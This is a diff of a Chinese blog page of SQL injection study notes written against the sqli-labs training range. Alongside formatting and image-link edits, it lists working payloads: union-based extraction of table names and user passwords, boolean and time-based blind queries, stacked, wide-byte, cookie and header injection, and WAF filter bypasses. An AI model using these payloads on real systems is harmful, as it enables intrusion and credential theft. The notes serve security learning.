@@ -206,7 +206,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      59
+      58
        分钟
     </span>
   
@@ -248,12 +248,13 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：2021年2月12日 下午
+                  本文最后更新于：2021年2月13日 凌晨
                 
               </p>
             
             <div class="markdown-body">
               <!-- more -->
+
 <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第一次写博客0.0，梳理也记录一下自己学习的知识点，也方便日后复习叭。<br>如有错漏还请不吝指正ya<br>一些前置知识：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/7344548.html">Sqli-labs之sql注入基础知识</a></p>
 <h1 id="sql注入原理"><a href="#sql注入原理" class="headerlink" title="sql注入原理"></a>sql注入原理</h1><ul>
 <li>sql 注入：即通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</li>
@@ -296,16 +297,16 @@
 <ol>
 <li><h4 id="hackbar"><a href="#hackbar" class="headerlink" title="hackbar"></a>hackbar</h4></li>
 </ol>
-<p>用的是google chrome 的这款hackbar，UI界面挺简洁的（免费）<img src="https://img-blog.csdnimg.cn/20201026000612809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20201026000457629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>不过使用时要注意<br>在注sqli-labs靶场的时候不删除选中的这一段会报错（还不明白为什么），就需要将图中蓝色这一段(submit=Subimt)删去再execute。<br>burpsubite中保持原样即可</p>
+<p>用的是google chrome 的这款hackbar，UI界面挺简洁的（免费）<img src="https://i.loli.net/2021/02/13/n4gqkmaNVLlxdjy.png" srcset="/img/loading.gif"></p>
+<p><img src="https://i.loli.net/2021/02/13/vexmbfJIXCR67g1.png" srcset="/img/loading.gif"><br>不过使用时要注意<br>在注sqli-labs靶场的时候不删除选中的这一段会报错（还不明白为什么），就需要将图中蓝色这一段(submit=Subimt)删去再execute。<br>burpsubite中保持原样即可</p>
 <ol start="2">
 <li><h4 id="burp-suite"><a href="#burp-suite" class="headerlink" title="burp suite"></a>burp suite</h4></li>
 </ol>
-<p>先抓包，丢去repeater，注入<br><img src="https://img-blog.csdnimg.cn/20201026001519181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p>先抓包，丢去repeater，注入<br><img src="https://i.loli.net/2021/02/13/87JTt2GvwUOoaLH.png" srcset="/img/loading.gif"></p>
 <h2 id="注释方式：-或–"><a href="#注释方式：-或–" class="headerlink" title="注释方式：#或–+"></a>注释方式：#或–+</h2><ul>
-<li><p>sql中的注释符为 <code>-- (空格)</code> 和 <code>#</code> 以及 <code>/* */</code><br>(多行注释 <code>/**/</code>为成对匹配，将 <code>/*</code> 和 <code>*/</code> 中的内容注释掉，可在注入时用于绕过过滤规则)<br><code>-- (空格)</code> ： sql中规定：–其后必须跟空格<br>(如果不加空格，– 会和系统自动生成的单引号连接在一起，被判定为关键词，无法注释掉系统自动生成的单引号)</p>
+<li><p>sql中的注释符为 <code>-- (空格)</code> 和 <code>#</code> 以及 <code>/* */</code><br>(多行注释 <code>/**/</code>为成对匹配，将 <code>/*</code> 和 <code>*/</code> 中的内容注释掉，可在注入时用于绕过过滤规则)<br> <code>-- (空格)</code> ： sql中规定：–其后必须跟空格<br> (如果不加空格，– 会和系统自动生成的单引号连接在一起，被判定为关键词，无法注释掉系统自动生成的单引号)</p>
 </li>
-<li><p>使用<code>--+</code>的原因：<br>在url中输入空格按回车，传输过程中<strong>末端</strong>的空格会被忽略，<strong>其余</strong>空格会被转义为%20。<br>而 + 会被解释为空格，因此在GET请求注入时使用<code>--+</code>或者<code>--%20</code>代替<code>--(空格)</code></p>
+<li><p>使用<code>--+</code>的原因：<br>在url中输入空格按回车，传输过程中<strong>末端</strong>的空格会被忽略，<strong>其余</strong>空格会被转义为%20。<br> 而 + 会被解释为空格，因此在GET请求注入时使用<code>--+</code>或者<code>--%20</code>代替<code>--(空格)</code></p>
 </li>
 </ul>
 <ul>
@@ -338,20 +339,20 @@
 <li>字符型的闭合方式很多<br>例如 <code>‘ ’</code>、 <code>“ ”</code>、<code>( )</code>，还有它们的变种组合 <code>(&#39; &#39;)</code>、 <code>(&quot; &quot;)</code> 等等</li>
 </ul>
 <blockquote>
-<p>eg:                              —(sqli-labs)–Less1<br>?id=1,正常回显<br> ?id=1 and 1=1 正常回显<br> ?id=1 and 1=2 正常回显<br>——————-判断为非数字型注入<br>?id=1’        变化/报错<br>?id=1’ –+        正常回显<br>——————-判断为字符型注入。闭合方式为单引号’ ’<br>—————————对不同闭合类型将 ‘ 改为对应闭合符号即可</p>
+<p>eg:                              —(sqli-labs)–Less1<br>?id=1,正常回显<br>?id=1 and 1=1 正常回显<br>?id=1 and 1=2 正常回显<br>——————-判断为非数字型注入<br>?id=1’        变化/报错<br>?id=1’ –+        正常回显<br>——————-判断为字符型注入。闭合方式为单引号’ ’<br>—————————对不同闭合类型将 ‘ 改为对应闭合符号即可</p>
 </blockquote>
 <h2 id="判断字段数及回显位"><a href="#判断字段数及回显位" class="headerlink" title="判断字段数及回显位"></a>判断字段数及回显位</h2><h3 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h3><blockquote>
-<p>eg:<br>?id=1’ order by 1 –+<br>?id=1’ order by 2 –+<br>?id=1’ order by 3 –+<br><img src="https://img-blog.csdnimg.cn/20201122010323880.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_10,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>?id=1’ order by 4 –+<br><img src="https://img-blog.csdnimg.cn/20201122010435459.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p>eg:<br>?id=1’ order by 1 –+<br>?id=1’ order by 2 –+<br>?id=1’ order by 3 –+<br><img src="https://i.loli.net/2021/02/13/PYcbg56GCvoNQ2H.png" srcset="/img/loading.gif"><br>?id=1’ order by 4 –+<br><img src="https://i.loli.net/2021/02/13/sV8G3k9mhRiIEaX.png" srcset="/img/loading.gif"></p>
 </blockquote>
 <p>说明字段数为3，</p>
 <h3 id="判断回显位"><a href="#判断回显位" class="headerlink" title="判断回显位"></a>判断回显位</h3><blockquote>
-<p>eg:<br>?id=-1’ union select 1,2,3 –+<br><img src="https://img-blog.csdnimg.cn/20201122010553263.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p>eg:<br>?id=-1’ union select 1,2,3 –+<br><img src="https://i.loli.net/2021/02/13/V9R1TWPtJSKjeNx.png" srcset="/img/loading.gif"></p>
 </blockquote>
 <p>2,3为回显位，因此在2、3的位置插入语句即可。</p>
 <blockquote>
 <p>eg:<br>?id=-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() –+</p>
 </blockquote>
-<h2 id="一库三表四字段"><a href="#一库三表四字段" class="headerlink" title="一库三表四字段"></a>一库三表四字段</h2><p>很多教程讲的很详细，这里不做赘述，挂个当时记的结构图<br><img src="https://img-blog.csdnimg.cn/20201122012406851.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>select schema_name from information_schema.schemata<br>select table_name from information_schema.tables where table_schema=’xxx’<br>select column_name from information_schema.columns where table_name=’xxx’<br>select group_concat(xxx) from xxx</p>
+<h2 id="一库三表四字段"><a href="#一库三表四字段" class="headerlink" title="一库三表四字段"></a>一库三表四字段</h2><p>很多教程讲的很详细，这里不做赘述，挂个当时记的结构图<br><img src="https://i.loli.net/2021/02/13/VMmBU5JvkuAH9Oe.jpg" srcset="/img/loading.gif"><br>select schema_name from information_schema.schemata<br>select table_name from information_schema.tables where table_schema=’xxx’<br>select column_name from information_schema.columns where table_name=’xxx’<br>select group_concat(xxx) from xxx</p>
 <h2 id="各种注入"><a href="#各种注入" class="headerlink" title="各种注入"></a>各种注入</h2><h3 id="union联合查询"><a href="#union联合查询" class="headerlink" title="union联合查询"></a>union联合查询</h3><ul>
 <li><p>适用：<code>页面有回显位的情况</code></p>
 </li>
@@ -361,7 +362,7 @@
 <li><p><code>select * from users where &#39;id&#39;=1</code></p>
 </li>
 <li><p><code>union select 1,2,3</code> </p>
-<p>  此时利用第二条语句(Union查询)即可获取数据库中的数据</p>
+<p> 此时利用第二条语句(Union查询)即可获取数据库中的数据</p>
 </li>
 </ol>
 </li>
@@ -409,29 +410,23 @@
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and length((select password from users order by id limit 0,1))=8 --+(长度)</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">left</span>((<span class="hljs-keyword">select</span> password <span class="hljs-keyword">from</span> users <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> id limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;dumb&#x27;</span> <span class="hljs-comment">--+</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and left((select username from users order by id limit 0,1),4)=&#x27;</span>dumb<span class="hljs-string">&#x27; --+</span><br></code></pre></td></tr></table></figure>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and length((select password from users order by id limit 1,1))=10 --+(长度)</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">left</span>((<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> id limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">8</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;angelina  &#x27;</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
 <h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><ul>
-<li><p>适用：<br><code>无查询结果、报错信息的回显，页面正常显示的情况</code></p>
-</li>
-<li><p>时间盲注即利用<code>sleep()</code>或<code>benchmark()</code>等函数使得命令执行时间变长，常与<code>if(expr1,expr2,expr3)</code>搭配使用猜解数据库</p>
-</li>
-<li><p><code>if(expr1,expr2,expr3)</code>含义：<code>exp1</code>为<strong>TRUE</strong> 则 if()返回值为<code>expr2</code>,否则返回值为<code>expr3</code>. ——即 (1真返回2，1假返回3).</p>
-</li>
-<li><p>eg判断数据库库名长度语句为：</p>
+<li>适用：<br><code>无查询结果、报错信息的回显，页面正常显示的情况</code></li>
+<li>时间盲注即利用<code>sleep()</code>或<code>benchmark()</code>等函数使得命令执行时间变长，常与<code>if(expr1,expr2,expr3)</code>搭配使用猜解数据库</li>
+<li><code>if(expr1,expr2,expr3)</code>含义：<code>exp1</code>为<strong>TRUE</strong> 则 if()返回值为<code>expr2</code>,否则返回值为<code>expr3</code>. ——即 (1真返回2，1假返回3).</li>
+<li>eg判断数据库库名长度语句为：</li>
+</ul>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">if (length ( database() ) <span class="hljs-operator">&gt;</span><span class="hljs-number">1</span> , sleep(<span class="hljs-number">5</span>) , <span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
-<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3></li>
-<li><p>堆叠注入的使用条件十分有限，可能受到API、数据库引擎或者权限的限制。</p>
-</li>
-<li><p>在堆叠注入页面中，程序会获取GET参数ID，并利用PDO的方式查询数据，ID会被拼接到查询语句当中，导致PDO没起到预编译的效果—-导致程序存在sql注入漏洞</p>
-</li>
-<li><p><em>只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行</em></p>
-</li>
-<li><p>堆叠查询可以执行多条语句，多语句之间以分号隔开。堆叠注入就是利用此特点，在第二条sql语句中构造要注入的语句。</p>
-</li>
-<li><p> eg：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;;select if(substr(user(),1,1)=&#x27;</span>r<span class="hljs-string">&#x27;,sleep(3),1) --+</span><br></code></pre></td></tr></table></figure></li>
-<li><p>这里的第二条语句(select if(substr(user(),1,1)=’r’,sleep(3),1) –+)即为时间盲注的语句</p>
-</li>
-<li><p>使用PDO执行SQL语句时，可以执行多条语句，不过这样通常不能直接得到注入结果，因为PDO只会返回第一条SQL语句执行的结果，所以在第二条语句中可以用update更新数据或者使用时间盲注获取数据</p>
-</li>
+<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><ul>
+<li>堆叠注入的使用条件十分有限，可能受到API、数据库引擎或者权限的限制。</li>
+<li>在堆叠注入页面中，程序会获取GET参数ID，并利用PDO的方式查询数据，ID会被拼接到查询语句当中，导致PDO没起到预编译的效果—-导致程序存在sql注入漏洞</li>
+<li><em>只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行</em></li>
+<li>堆叠查询可以执行多条语句，多语句之间以分号隔开。堆叠注入就是利用此特点，在第二条sql语句中构造要注入的语句。</li>
+<li>eg：</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;;select if(substr(user(),1,1)=&#x27;</span>r<span class="hljs-string">&#x27;,sleep(3),1) --+</span><br></code></pre></td></tr></table></figure>
+<ul>
+<li>这里的第二条语句(select if(substr(user(),1,1)=’r’,sleep(3),1) –+)即为时间盲注的语句</li>
+<li>使用PDO执行SQL语句时，可以执行多条语句，不过这样通常不能直接得到注入结果，因为PDO只会返回第一条SQL语句执行的结果，所以在第二条语句中可以用update更新数据或者使用时间盲注获取数据</li>
 </ul>
 <h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><ul>
 <li><p>适用<code> 注入漏洞页面与查询页面不在同一页面</code></p>
@@ -449,13 +444,12 @@
 <li><p>原理：<br><code>反斜杠编码是%5c，GBK编码中%df%5c表示为一个繁体字’運‘，从而绕过反斜杠。（不仅仅可以适用%df%5c,凡是能构造成GBK双字节的都能产生这样的绕过效果）</code></p>
 </li>
 <li><p>比如输入的id被 <code>&#39;</code>包围，输入<code>id=1&#39;</code>，程序不报错，但会多出一个反斜杠(<code>id= &#39;1\&#39;&#39;</code>)，此时输入的单引号被反斜杠转义，从而导致输入的单引号无法形成闭合。通常这种情况下此处是不存在sql注入漏洞的。<br>但数据库查询前执行了SET NAMES ‘GBK’语句，会将编码设置为宽字节GBK。造成此处的宽字节漏洞。</p>
-<h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3></li>
-<li><p>适用：<br><code>URL中没有GET参数，但页面返回正常。抓包发现cookie中存在i类似d=1的参数。(参数名不一定是id，也可能是uname等等)</code></p>
 </li>
-<li><p>原理：<br><code>程序通过$_COOKIE获取参数ID，然后将ID拼接到select语句中查询。若不对cookie中的参数id进行过滤就会存在sql注入漏洞。</code></p>
-</li>
-<li><p>和基于GET的url注入套路相似。</p>
-</li>
+</ul>
+<h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><ul>
+<li>适用：<br><code>URL中没有GET参数，但页面返回正常。抓包发现cookie中存在i类似d=1的参数。(参数名不一定是id，也可能是uname等等)</code></li>
+<li>原理：<br><code>程序通过$_COOKIE获取参数ID，然后将ID拼接到select语句中查询。若不对cookie中的参数id进行过滤就会存在sql注入漏洞。</code></li>
+<li>和基于GET的url注入套路相似。</li>
 </ul>
 <h3 id="User-Agent"><a href="#User-Agent" class="headerlink" title="User-Agent"></a>User-Agent</h3><ul>
 <li>适用：<br><code>参数出现在User-Agent信息中。</code></li>
@@ -486,21 +480,28 @@
 </li>
 <li><p>服务器会字段对URL进行一次编码，所以要把关键词编码两次。<br>注：此处URL编码要选择全编码</p>
 </li>
-<li><p>原理：<br><code>服务器会进行一次编码，但后续的进程如服务器、程序函数等等解码并不统一，攻击者就是利用此处的不统一将关键字在过滤出进行编码绕过，再在随后的解码步骤解码还原。</code>（图片源自网易Web安全工程师课程，侵删）：<img src="https://img-blog.csdnimg.cn/20201124161940246.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<li><p>原理：<br><code>服务器会进行一次编码，但后续的进程如服务器、程序函数等等解码并不统一，攻击者就是利用此处的不统一将关键字在过滤出进行编码绕过，再在随后的解码步骤解码还原。</code>：<img src="https://i.loli.net/2021/02/13/iWvGmyjHk5Y27UC.jpg" srcset="/img/loading.gif" alt="图片源自网易Web安全工程师课程，侵删"></p>
 </li>
 </ul>
 <h2 id="内联注释绕过注入"><a href="#内联注释绕过注入" class="headerlink" title="内联注释绕过注入"></a>内联注释绕过注入</h2><ul>
 <li>将被过滤的关键字用<code>/*！*/</code>包起来即可。</li>
-<li>原理：<br> 在mysql中，内联注释<code>/*！code */</code>中的code虽然被注释了但仍能发挥其在语句中的作用。</li>
+<li>原理：<br>在mysql中，内联注释<code>/*！code */</code>中的code虽然被注释了但仍能发挥其在语句中的作用。</li>
 </ul>
 <h2 id="特殊符号绕过"><a href="#特殊符号绕过" class="headerlink" title="特殊符号绕过"></a>特殊符号绕过</h2><p>除了以上这些，有些waf也会过滤一些特殊符号：空格、=、&lt;、&gt;等等<br>这里的bypass方法实际就是寻找等效的命令，或者用特殊的姿势实现绕过</p>
 <h3 id="空格过滤绕过注入"><a href="#空格过滤绕过注入" class="headerlink" title="空格过滤绕过注入"></a>空格过滤绕过注入</h3><ul>
 <li>适用于空格被置换为空的情况，除了sql注入，很多地方都有这样的WAF</li>
-<li>bypass：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">()<br><span class="hljs-comment">/**/</span><br>回车(url编码为：<span class="hljs-operator">%</span><span class="hljs-number">0</span>a)<br>`(反引号)<br>tap<br>双空格<br></code></pre></td></tr></table></figure>
-<h3 id="or-and-xor-not过滤绕过"><a href="#or-and-xor-not过滤绕过" class="headerlink" title="or and xor not过滤绕过"></a>or and xor not过滤绕过</h3></li>
-<li>bypass:<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> <span class="hljs-operator">=</span> <span class="hljs-operator">&amp;&amp;</span><br><span class="hljs-keyword">or</span> <span class="hljs-operator">=</span> <span class="hljs-operator">||</span><br>xor <span class="hljs-operator">=</span> <span class="hljs-operator">|</span> # 异或<br><span class="hljs-keyword">not</span> <span class="hljs-operator">=</span> <span class="hljs-operator">!</span><br></code></pre></td></tr></table></figure>
-<h3 id="号过滤绕过"><a href="#号过滤绕过" class="headerlink" title="=号过滤绕过"></a>=号过滤绕过</h3></li>
-<li>bypass: <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">不加通配符`<span class="hljs-operator">%</span>`的`<span class="hljs-keyword">like</span>`和`relike`<br>`<span class="hljs-operator">!</span><span class="hljs-operator">&lt;&gt;</span>`<br>利用关键字`regexp`进行正则表达匹配<br>利用比较函数`strcmp(str1,str2)`<br></code></pre></td></tr></table></figure></li>
+<li>bypass：</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">()<br><span class="hljs-comment">/**/</span><br>回车(url编码为：<span class="hljs-operator">%</span><span class="hljs-number">0</span>a)<br>`(反引号)<br>tap<br>双空格<br></code></pre></td></tr></table></figure>
+<h3 id="or-and-xor-not过滤绕过"><a href="#or-and-xor-not过滤绕过" class="headerlink" title="or and xor not过滤绕过"></a>or and xor not过滤绕过</h3><ul>
+<li>bypass:</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> <span class="hljs-operator">=</span> <span class="hljs-operator">&amp;&amp;</span><br><span class="hljs-keyword">or</span> <span class="hljs-operator">=</span> <span class="hljs-operator">||</span><br>xor <span class="hljs-operator">=</span> <span class="hljs-operator">|</span> # 异或<br><span class="hljs-keyword">not</span> <span class="hljs-operator">=</span> <span class="hljs-operator">!</span><br></code></pre></td></tr></table></figure>
+<h3 id="号过滤绕过"><a href="#号过滤绕过" class="headerlink" title="=号过滤绕过"></a>=号过滤绕过</h3><ul>
+<li>bypass: </li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">不加通配符`<span class="hljs-operator">%</span>`的`<span class="hljs-keyword">like</span>`和`relike`<br>`<span class="hljs-operator">!</span><span class="hljs-operator">&lt;&gt;</span>`<br>利用关键字`regexp`进行正则表达匹配<br>利用比较函数`strcmp(str1,str2)`<br></code></pre></td></tr></table></figure>
+<ul>
 <li>不加通配符<code>%</code>的<code>like</code>和<code>relike</code> (效果等同于=)</li>
 </ul>
 <p>不加通配符<code>%</code>的<code>like</code>：</p>
@@ -515,14 +516,16 @@
 <h3 id="引号-单、双-过滤绕韩国"><a href="#引号-单、双-过滤绕韩国" class="headerlink" title="引号(单、双)过滤绕韩国"></a>引号(单、双)过滤绕韩国</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">引号连同引号内内容一起转为十六进制<br>宽字节绕过：<br>    # 过滤单引号时<br>    <span class="hljs-operator">%</span>bf<span class="hljs-operator">%</span><span class="hljs-number">27</span> <span class="hljs-operator">%</span>df<span class="hljs-operator">%</span><span class="hljs-number">27</span> <span class="hljs-operator">%</span>aa<span class="hljs-operator">%</span><span class="hljs-number">27</span><br><span class="hljs-operator">%</span>df\’ <span class="hljs-operator">=</span> <span class="hljs-operator">%</span>df<span class="hljs-operator">%</span><span class="hljs-number">5</span>c<span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-operator">=</span>縗’<br></code></pre></td></tr></table></figure>
 <h3 id="，过滤绕过"><a href="#，过滤绕过" class="headerlink" title="，过滤绕过"></a>，过滤绕过</h3><ul>
 <li>，被过滤会影响许多函数的使用,特别是盲注需要用到很多函数都需要逗号</li>
-<li>bypass：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">from</span> pos <span class="hljs-keyword">for</span> len<br><span class="hljs-keyword">join</span><br>关键字 <span class="hljs-keyword">like</span>(提取子串的函数中的逗号 <span class="hljs-keyword">select</span> ascii(substr(<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">114</span>; <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>() <span class="hljs-keyword">like</span> &quot;r%&quot;)<br>关键字 <span class="hljs-keyword">offset</span>(limit <span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> limit <span class="hljs-number">1</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure>
-eg:<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">from</span> pos <span class="hljs-keyword">for</span> len 代替 ，<br>原本的substr函数：           <span class="hljs-keyword">select</span> substr(&quot;string&quot;,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>); <br>用<span class="hljs-keyword">from</span> pos <span class="hljs-keyword">for</span> len代替逗号： <span class="hljs-keyword">select</span> substr(&quot;string&quot; <span class="hljs-keyword">from</span> <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-number">3</span>);<br></code></pre></td></tr></table></figure>
+<li>bypass：</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">from</span> pos <span class="hljs-keyword">for</span> len<br><span class="hljs-keyword">join</span><br>关键字 <span class="hljs-keyword">like</span>(提取子串的函数中的逗号 <span class="hljs-keyword">select</span> ascii(substr(<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">114</span>; <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>() <span class="hljs-keyword">like</span> &quot;r%&quot;)<br>关键字 <span class="hljs-keyword">offset</span>(limit <span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> limit <span class="hljs-number">1</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure>
+<p>eg:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">from</span> pos <span class="hljs-keyword">for</span> len 代替 ，<br>原本的substr函数：           <span class="hljs-keyword">select</span> substr(&quot;string&quot;,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>); <br>用<span class="hljs-keyword">from</span> pos <span class="hljs-keyword">for</span> len代替逗号： <span class="hljs-keyword">select</span> substr(&quot;string&quot; <span class="hljs-keyword">from</span> <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-number">3</span>);<br></code></pre></td></tr></table></figure>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">原语句：<span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><br><span class="hljs-keyword">join</span> 代替 ，：<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users  <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>)a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> 